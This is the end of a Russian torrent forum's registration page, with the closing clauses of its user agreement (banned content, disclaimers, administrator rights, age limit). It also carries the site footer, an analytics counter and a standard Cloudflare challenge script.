+<p>- размещать hash-файлы(торренты) данных, содержащие вирусы или другие компьютерные программы заведомо вредоносного действия, файлы или программы, предназначенные для нарушения, уничтожения либо ограничения функциональности любого компьютерного или телекоммуникационного оборудования или программ, для осуществления несанкционированного доступа, а также серийные номера к коммерческим программным продуктам и программы для их генерации, логины, пароли и прочие средства для получения несанкционированного доступа к платным ресурсам в Интернете, а также размещать ссылки на вышеуказанную информацию;</p>
+
+<p>- размещать hash-файлы(торренты) любых сообщений, данных или программ, использование которых затрагивает какой-либо патент, торговую марку, коммерческую тайну, копирайт или прочие права собственности и/или авторские и смежные с ним права третьих лиц;</p>
+
+<p>- отправлять на адреса электронной почты, указанные на сайте, несанкционированные почтовые сообщения рекламного типа (junk mail, spam);</p>
+
+<p>- копировать и использовать в коммерческих целях любую информацию, получаемую посредством данного ресурса, нарушающую права других Пользователей или могущую нанести им прямой материальный или моральный ущерб;</p>
+
+<p>- размещать ссылки на ресурсы Сети;</p>
+
+<p>- заниматься коммерцией при помощи форума; проявлять расовую, национальную и религиозную неприязнь, призывать к самоубийству, пропагандировать терроризм, экстремизм, наркотики и прочие темы, несовместимые с общепринятыми законами морали и приличия;</p>
+
+<p>- выдавать себя за другого человека или за представителя организации и/или сообщества без достаточных на то прав, в том числе за сотрудников Aдминистрации, за владельца Ресурса.</p>
+
+<p>4. ГАРАНТИИ РАБОТОСПОСОБНОСТИ</p>
+
+<p>Доступ к Ресурсу предоставляются по принципу «как есть» («as is») без гарантий любого рода, как прямых, так и косвенных.</p>
+
+<p>В частности Администрация Ресурса не гарантирует работоспособность как сайта и его отдельных разделов, так и работоспособность и достоверность ссылок, размещенных на нем его Пользователями.</p>
+
+<p>Ресурс не несет ответственности за любые прямые или непрямые убытки, произошедшие из-за: использования либо невозможности использования службы; несанкционированного доступа к Вашим коммуникациям.</p>
+
+<p>5. ПРАВА АДМИНИСТРАЦИИ РЕСУРСА.</p>
+
+<p>Администрация Ресурса вправе отказать в доступе к Ресурсу любому Пользователю, или группе Пользователей без объяснения причин своих действий и предварительного уведомления.</p>
+
+<p>Администрация Ресурса вправе изменять либо удалять ссылки на информацию, hash-файлы (торренты), графические, звуковые и прочие данные, размещенные Пользователями на Ресурсе, без предварительного уведомления и объяснения причин своих действий.</p>
+
+<p>6. ОТВЕТСТВЕННОСТЬ СТОРОН.</p>
+
+<p>Пользователь соглашается с тем, что нормы и законы о защите прав потребителей не могут быть применимы к использованию им Ресурса, поскольку он не оказывает возмездных услуг.</p>
+
+<p>Ресурс не устанавливает с пользователями агентских отношений, отношений товарищества, отношений по совместной деятельности, отношений личного найма, а также каких-то иных отношений, прямо не описанных в СОГЛАШЕНИИ ОБ ИСПОЛЬЗОВАНИИ.</p>
+
+<p>Бездействие со стороны Ресурса в случае нарушения Пользователем, либо группой Пользователей ПОЛЬЗОВАТЕЛЬСКОГО СОГЛАШЕНИЯ не означает того, что Ресурс содействует Пользователю, либо группе Пользователей в таковых действиях.</p>
+
+<p>Бездействие со стороны Ресурса в случае нарушения Пользователем либо группой Пользователей ПОЛЬЗОВАТЕЛЬСКОГО СОГЛАШЕНИЯ не лишает Ресурс права предпринять соответствующие действия в защиту своих интересов позднее.</p>
+
+<p>7. СОГЛАСИЕ С ПОЛЬЗОВАТЕЛЬСКИМ СОГЛАШЕНИЕМ.</p>
+
+<p>ЕСЛИ ВЫ НЕ СОГЛАСНЫ СO ВСЕМИ ВЫШЕУКАЗАННЫМИ УСЛОВИЯМИ, ВЫ НЕ ИМЕЕТЕ ПРАВА ПОСЕЩАТЬ РЕСУРС КАК В ЦЕЛОМ, ТАК И ЛЮБУЮ ЕГО ЧАСТЬ, КРОМЕ СТРАНИЦЫ С ПОЛЬЗОВАТЕЛЬСКИМ СОГЛАШЕНИЕМ, ПОЛУЧАТЬ И/ИЛИ ИСПОЛЬЗОВАТЬ СОДЕРЖИМОЕ НАСТОЯЩЕГО РЕСУРСА ЛЮБЫМИ ДРУГИМИ СПОСОБАМИ КАК В ЦЕЛОМ ТАК И В ЛЮБОЙ ЕГО ЧАСТИ!</p>
+
+<p>ЕСЛИ ВЫ НЕ СОГЛАСНЫ С ПОЛЬЗОВАТЕЛЬСКИМ СОГЛАШЕНИЕМ ИЛИ ВАМ ЕЩЕ НЕ ИСПОЛНИЛОСЬ 18 ЛЕТ, ВЫ ДОЛЖНЫ НЕМЕДЛЕННО ПОКИНУТЬ РЕСУРС. </p>
+
+
+</article>
+				</fieldset>
+			</div>
+		</td>
+	</tr>
+	<tr class="reg-agreement">
+		<td class="catBottom" colspan="2">
+			<div>
+				<input id="reg-confirm-agreement" type="button" value="Я согласен с условиями" class="bold x-long">
+			</div>
+		</td>
+	</tr>
+	<tr class="reg-confirm-email" style="display: none;">
+		<td class="row5" colspan="2">
+			<div>
+				Пожалуйста, ещё раз проверьте, что вы правильно указали <b>email</b>
+			</div>
+			<div id="reg-email-text"></div>
+			<div>
+				<input id="reg-submit" type="submit" name="submit" value="Email указан верно" class="bold x-long">
+			</div>
+		</td>
+	</tr>
+	
+	</table>
+
+</form>
+
+				</div><!--/main_content_wrap-->
+			</td><!--/main_content-->
+
+		</tr>
+		</table>
+	</div><!--/page_content-->
+
+	<!--page_footer-->
+	<div id="page_footer" class="hide-for-print">
+
+		
+		<div class="clear"></div>
+
+		<nav id="footer-info-links">
+			<div>
+				<a href="info.php?show=user_agreement" rel="nofollow">Условия использования</a>
+				&middot;
+				<a href="info.php?show=advert" rel="nofollow">Реклама на сайте</a>
+				&middot;
+				<a href="info.php?show=copyright_holders" rel="nofollow">Для правообладателей</a>
+				&middot;
+				<a href="info.php?show=press" rel="nofollow">Для прессы</a>
+				&middot;
+				<a href="viewtopic.php?t=2234744">Для провайдеров</a>
+				<!--&middot;-->
+				<!--<a href="http://rutracker.news">Блог</a>-->
+				&middot;
+				<a href="https://rutracker.wiki">Торрентопедия</a>
+			</div>
+			<div>
+				<a href="viewtopic.php?t=1045"><b>Правила</b></a>
+				&middot;
+				<a href="/go/8" rel="nofollow">Кому задать вопрос</a>
+				&middot;
+				<a href="viewforum.php?f=1538">Авторские раздачи</a>
+				&middot;
+				<a href="viewforum.php?f=1289">Конкурсы</a>
+				&middot;
+				<a href="viewforum.php?f=2332">Новости &quot;Хранителей&quot; и &quot;Антикваров&quot;</a>
+				&middot;
+				<a href="#" onclick="return post2url('index.php', {rand_rel: 1});" rel="nofollow">Случайная раздача</a>
+			</div>
+		</nav>
+
+		
+		<div class="tCenter nowrap" style="margin: 18px 4px 4px 4px;">
+								</div>
+
+		<div class="footer-bottom-links">
+			<ul class="inlined middot-separated">
+				<li><a href="groupcp.php?g=104792" rel="nofollow" target="_blank">Администрация</a></li>
+				<li><a href="groupcp.php?g=104787" rel="nofollow" target="_blank">Модераторы</a></li>
+				<li><a href="groupcp.php?g=104841" rel="nofollow" target="_blank">Тех. помощь</a></li>
+				<li><a href="https://t.me/rutracker_news" rel="nofollow" target="_blank">Telegram-канал</a></li>
+			</ul>
+			<div class="wide">
+									<script>
+					$(function () {
+						var title = "";
+						var src = "https://counter.yadro.ru/hit?t44.1;r" + encodeURIComponent(document.referrer) +
+							((typeof (screen) == "undefined") ? "" : ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ? screen.colorDepth : screen.pixelDepth)) +
+							";u" + encodeURIComponent(document.URL) + ";h" + encodeURIComponent(title.substring(0, 80)) + ";" + Math.random();
+						$('<img src="' + src + '" alt="">').on('load', function () {
+							$('#liveinternet').append(this);
+						});
+					});
+					</script>
+					<a id="liveinternet" href="https://www.liveinternet.ru/stat/rutracker.org/index.html?lang=ru" target="_blank"></a>
+							</div>
+			<ul class="inlined middot-separated">
+																							</ul>
+		</div>
+
+	</div><!--/page_footer-->
+</div><!--/page_container-->
+
+
+<div id="ajax-loading"><b>Loading...</b></div>
+<div id="ajax-error"><b>Error</b></div>
+<style>
+#bb-alert-box {
+	width: auto;
+	max-width: 800px;
+	line-height: 18px;
+	display: none;
+}
+#bb-alert-msg {
+	min-width: 400px;
+	max-height: 400px;
+	margin: 50px 20px;
+	padding: 10px;
+	overflow: auto;
+	text-align: center;
+}
+.bb-alert-err {
+	color: #7E0000;
+	background: #FFEEEE;
+	box-shadow: 0 0 20px #B85353;
+	font-weight: bold;
+}
+</style>
+<div id="bb-alert-box">
+	<div id="bb-alert-msg"></div>
+</div>
+<div id="modal-blocker"></div>
+
+<script>
+$(function () {
+	if (!BB.hasET() && BB.getUrlParam('view') !== 'print') {
+		BB.navbar.init();
+	}
+});
+</script>
+<div id="nav-panel" class="nav-hidden-arrow hide-for-print">
+	<div id="nav-up" class="nav-btn" title="Вверх">
+		<span class="nav-icon"></span>
+	</div>
+	<div id="nav-settings" class="nav-btn">
+		<span class="nav-icon" title="Настройки"></span>
+		<ul id="nav-opt-menu">
+			<li class="nav-event" data-event="click">Показывать по клику</li>
+			<li class="nav-event" data-event="mouseenter">Показывать по наведению</li>
+		</ul>
+	</div>
+	<div id="nav-down" class="nav-btn" title="Вниз">
+		<span class="nav-icon"></span>
+	</div>
+	<div class="nav-hidden-overlay"></div>
+</div>
+
+	</div><!--/body_container-->
+
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a0d1e48d9bb2c11c',t:'MTc4MTY5NzYxNA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
